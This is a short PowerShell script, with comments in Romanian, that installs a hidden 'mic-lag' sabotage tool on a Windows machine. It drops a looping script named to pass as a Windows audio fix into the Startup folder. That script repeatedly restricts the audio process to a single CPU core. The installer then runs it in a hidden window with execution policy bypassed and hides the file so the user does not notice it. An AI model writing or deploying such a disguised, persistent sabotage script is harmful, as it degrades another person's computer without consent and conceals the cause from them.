# Permanent mic-lag installer (2025 edition)
$source = @'
while($true){
    $p = Get-Process audiodg -ErrorAction SilentlyContinue
    if($p){$p.ProcessorAffinity=[IntPtr]1}
    Start-Sleep -Seconds 5
}
'@

# Scrie scriptul în folder-ul Startup (pornește la fiecare login)
$folder = [Environment]::GetFolderPath('Startup')
$path   = "$folder\WindowsAudioFix.ps1"
$source | Out-File -FilePath $path -Encoding UTF8 -Force

# Pornește imediat și ascunde fereastra
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$path`""

# Bonus: ascunde și shortcut-ul ca să nu-l vadă ușor
attrib +h "$path"